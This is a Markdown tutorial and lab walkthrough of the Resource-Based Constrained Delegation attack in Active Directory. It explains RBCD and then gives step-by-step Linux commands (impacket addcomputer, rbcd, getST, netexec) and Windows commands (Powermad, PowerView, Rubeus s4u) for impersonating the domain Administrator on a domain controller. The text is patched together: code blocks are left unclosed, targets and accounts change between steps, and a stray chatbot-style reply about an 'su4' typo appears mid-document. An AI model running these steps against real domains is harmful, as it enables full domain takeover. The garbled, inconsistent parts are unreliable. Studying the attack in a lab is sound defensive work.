# üîê Resource-Based Constrained Delegation (RBCD) Attack


##  What is Resource-Based Constrained Delegation (RBCD)?

**Resource-Based Constrained Delegation (RBCD)** is a security feature in **Active Directory (AD)** that allows administrators to configure **which accounts can impersonate users to access a specific resource**, such as a server or service. Introduced in **Windows Server 2012 R2**, RBCD is a modern and more secure alternative to traditional **Kerberos Constrained Delegation (KCD)**.

Unlike classic KCD, where **delegation is configured on the service account** (i.e., the "caller"), RBCD flips the model: the **resource owner defines who is allowed to impersonate** users to access that resource. This provides greater flexibility and enforces **principle of least privilege**.

---

##  Why Use RBCD?

* **Granular Access Control**: RBCD allows defining access *per resource*, not per service account.
* **Least Privilege Enforcement**: Service accounts can impersonate users only to specific resources ‚Äî not domain-wide.
* **Better Security**: Reduces attack surface by limiting impersonation scope.
* **No Domain Admin Required**: Even non-privileged users can register computer accounts and delegate to them ‚Äî useful in post-exploitation.

---

## Example difference of KCD and RBCD

###  **Traditional Kerberos Constrained Delegation (KCD)**

####  **Configured on: The service account**

You configure the service account to delegate access to specific services on specific hosts.

####  **Example Scenario:**

You have:

* `WebAppSrv$` ‚Äì computer account running a web app
* `SQLSrv` ‚Äì SQL server with a database
* Users ‚Äì authenticated users who access the web app

####  How it works (KCD):

* On `WebAppSrv$` (in AD), you set:
  `Trust this computer for delegation to specified services only`

* Then you add:
  `MSSQLSvc/sqlsrv.furious.local` (the SPN of SQLSrv)

####  Result:

* `WebAppSrv$` can impersonate **any user** to the SQL service on `SQLSrv`.

**Problem**: If `WebAppSrv$` is compromised, it can impersonate **anyone** to `SQLSrv` from **anywhere**.

---

###  **Resource-Based Constrained Delegation (RBCD)**

####  **Configured on: The resource (target server)**

You configure the **target resource** to specify **who is allowed to impersonate users to it**.

####  **Same Scenario (RBCD way):**

* `WebAppSrv$` ‚Äì computer account running a web app
* `SQLSrv` ‚Äì SQL server with a database
* Users ‚Äì authenticated users who access the web app

#### How it works (RBCD):

* On **`SQLSrv`**, you set:
  The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute in AD
  ‚û§ Add `WebAppSrv$` as allowed to delegate **to `SQLSrv`**

####  Result:

* Now `WebAppSrv$` can impersonate users **only to SQLSrv**
* **Other resources (like FileSrv or DC01) remain protected**

**Security Benefit**: If `WebAppSrv$` is compromised, it can **only** access `SQLSrv`, **not** other services.



## How to Enable Resource-Based Constrained Delegation (RBCD)**

To enable RBCD, you must configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the **target computer account** in Active Directory. This attribute defines which security principals (like service accounts or computers) are allowed to impersonate users **to that resource**. You can set it using PowerShell or LDAP tools. Once configured, the specified account can impersonate users when accessing the service ‚Äî but **only to that resource**, ensuring granular control and enforcing least privilege. Always assign this permission carefully to avoid unintended access.


## What is an RBCD Attack?

An RBCD (Resource-Based Constrained Delegation) attack is a post-exploitation technique in Active Directory where an attacker abuses misconfigured or overly permissive delegation settings. If an attacker compromises a low-privileged account and can create or control a computer account, they can configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer (often a domain controller) to include their controlled account. This allows them to impersonate any domain user ‚Äî including domain admins ‚Äî to the target service. Once impersonation is successful, the attacker can request service tickets and potentially gain privileged access, leading to full domain compromise.

### Setting up Lab for RBCD

1. We must have **GenericWrite** permission on a computer object.
2. Create or use an existing user (e.g., `jcharles`).
3. Go to the computer object in **Active Directory Users and Computers**.
4. Open the **Security** tab, add the user, and grant **Write** permission.
5. This gives `jcharles` **GenericWrite** on the computer object.

### Enumeration

We can confirm that the user `jcharles` has **GenericWrite** permissions on the computer object `DC01-FURIOUS5`.

##  Exploiting RBCD Attack (From Linux)


### 1. Create a New Computer Account

We begin by creating a new computer account `NewComp$` using the user `jcharles` (password: `complex1@`). The new computer password is `password123`.

```bash
impacket-addcomputer -computer-name 'NewComp$' -computer-pass 'password123' -dc-host furious.local 'furious.local/jcharles:complex1@'
```

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Home-lab/rbcd]
‚îî‚îÄ$ impacket-addcomputer -computer-name 'NewComp$' -computer-pass 'password123'  -dc-host furious.local  'furious.local'/'jcharles':'complex1@'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account NewComp$ with password password123.
```

---

### 2. Set the RBCD Permissions

We populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow `NewComp$` to impersonate accounts on the domain controller `DC01-FURIOUS5$`.

```bash
impacket-rbcd -delegate-from 'NewComp$' -delegate-to 'DC01-FURIOUS5$' -dc-ip 192.168.129.140 -action 'write' 'furious.local/jcharles:complex1@'
```

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Home-lab/rbcd]
‚îî‚îÄ$ impacket-rbcd -delegate-from 'NewComp$' -delegate-to 'DC01-FURIOUS5$' -dc-ip 192.168.129.140  -action 'write' 'furious.local'/'jcharles':'complex1@'

### 3. Get a Service Ticket for Administrator

We now impersonate the `Administrator` account and request a CIFS service ticket using `getST.py`.

```bash
impacket-getST -spn 'cifs/DC01-FURIOUS5.furious.local' -impersonate administrator -dc-ip 192.168.129.140 'furious.local/NewComp$:password123'
```

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Home-lab/rbcd]
‚îî‚îÄ$ impacket-getST -spn 'cifs/DC01-FURIOUS5.furious.local' -impersonate administrator -dc-ip 192.168.129.140 'furious.local/NewComp$:password123'

### 4. Export the Ticket and Authenticate

Export the saved Kerberos ticket and authenticate using it:

```bash
export KRB5CCNAME=administrator@cifs_DC01-FURIOUS5.furious.local@FURIOUS.LOCAL.ccache
netexec smb 192.168.129.140 -u 'Administrator' --use-kcache
```

```bash

## Exploiting RBCD Attack (From Windows)



### 1. Upload Required Tools

First, upload the following tools to the target system:

* `PowerView.ps1`
* `Powermad.ps1`
* `Rubeus.exe`

Then load PowerView and Powermad into the current PowerShell session:

```powershell
. .\PowerView.ps1
. .\Powermad.ps1
```

---

### 2. Create a New Machine Account

Use Powermad to create a new attacker-controlled computer account:

```powershell
New-MachineAccount -MachineAccount evilcomp -Password $(ConvertTo-SecureString 'password' -AsPlainText -Force)
```

---

### 3. Get the SID of the New Computer Account

Retrieve the **SID** of the newly created computer using PowerView:

```powershell
$ComputerSid = Get-DomainComputer evilcomp -Properties objectsid | Select -Expand objectsid
```

---

### 4. Create a New Security Descriptor

Build a generic **Access Control Entry (ACE)** using the attacker computer SID:

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

---

### 5. Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` Attribute

Apply the new security descriptor to the target computer (`DC01-FURIOUS5`) using PowerView:

```powershell
Get-DomainComputer DC01-FURIOUS5 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

<img src="Imgs/image3.png" alt="Setting msDS-AllowedToActOnBehalfOfOtherIdentity">

---

### 6. Hash the Password Using Rubeus

Use Rubeus to hash the plaintext password (`password`) into its `RC4_HMAC` format:

```cmd
Rubeus.exe hash /password:password
```

Output:

```
8846F7EAEE8FB117AD06BDD830B7586C
```

<img src="Imgs/image4.png" alt="RC4_HMAC hash from Rubeus">

---

### 7. Perform S4U Delegation with Rubeus

Use Rubeus to impersonate the domain administrator and request a service ticket for the target service (`cifs/dc.support.htb`):

```cmd
Rubeus.exe s4u /user:system$ /rc4:8846F7EAEE8FB117AD06BDD830B7586C /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

<img src="Imgs/image5.png" alt="S4U impersonation using Rubeus">

---

### 8. Convert and Export the Ticket

1. Decode the base64 output from Rubeus.
2. Convert it to `.ccache` format using `impacket-ticketconverter`.
3. Export it for use with `netexec`.

It looks like you meant **S4U**, not **su4** ‚Äî it's a common typo. Here's what **S4U** means in the context of Windows authentication and the RBCD attack:

---

##  What is S4U?

**S4U** stands for **Service for User**, and it's part of the **Kerberos protocol extension** in Windows that allows a service to obtain a Kerberos service ticket on behalf of a user, **without needing the user's password**.

It has two main components:

### 1. **S4U2Self (Service for User to Self)**

Allows a service to **request a ticket for itself** on behalf of a user.

* The service can say: *"I want to act as this user to myself."*
* Useful when the user did not authenticate via Kerberos (e.g., via NTLM or another method).

### 2. **S4U2Proxy (Service for User to Proxy)**

Allows a service that received an S4U2Self ticket to **request access to another service** on behalf of that user.

* The service can now act **as if it were the user**, to another service (like CIFS, HTTP, LDAP, etc.).
* This is what **Resource-Based Constrained Delegation (RBCD)** abuses.
